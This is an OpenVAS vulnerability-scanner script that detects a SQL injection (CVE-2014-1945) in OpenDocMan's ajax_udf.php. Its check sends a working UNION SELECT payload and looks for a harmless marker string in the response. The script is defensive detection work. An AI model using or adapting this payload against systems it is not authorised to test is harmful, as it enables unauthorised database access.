###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_open_doc_man_65775.nasl 6756 2017-07-18 13:31:14Z cfischer $
#
# OpenDocMan 'ajax_udf.php' Multiple SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103913";
CPE = "cpe:/a:opendocman:opendocman";

tag_insight = 'The vulnerability exists due to insufficient validation
of "add_value" HTTP GET parameter in "/ajax_udf.php".';

tag_impact = "An attacker can exploit these issues by manipulating the SQL query
logic to carry out unauthorized actions on the underlying database.";

tag_affected = "OpenDocMan 1.2.7.1 is vulnerable; other versions may also be affected.";

tag_summary = "OpenDocMan is prone to multiple SQL-injection vulnerabilities because
it fails to sufficiently sanitize user-supplied data.";

tag_solution = "Updates are available. Please see the references or vendor advisory
for more information.";

tag_vuldetect = "Try to inject SQL code.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(65775);
 script_cve_id("CVE-2014-1945");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 6756 $");

 script_name("OpenDocMan 'ajax_udf.php' Multiple SQL Injection Vulnerabilities");


 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65775");
 script_xref(name:"URL", value:"http://opendocman.sourceforge.net/");
 
 script_tag(name:"last_modification", value:"$Date: 2017-07-18 15:31:14 +0200 (Tue, 18 Jul 2017) $");
 script_tag(name:"creation_date", value:"2014-03-11 15:18:54 +0100 (Tue, 11 Mar 2014)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("secpod_opendocman_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("OpenDocMan/installed");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, nvt:SCRIPT_OID ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, nvt:SCRIPT_OID, port:port ) ) exit( 0 );

url = dir + '/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7,8,9';

if( http_vuln_check(port:port, url:url, pattern:"OpenVAS-SQL-Injection-Test" ) )
{
  security_message(port:port);
  exit(0);

}

exit(0);

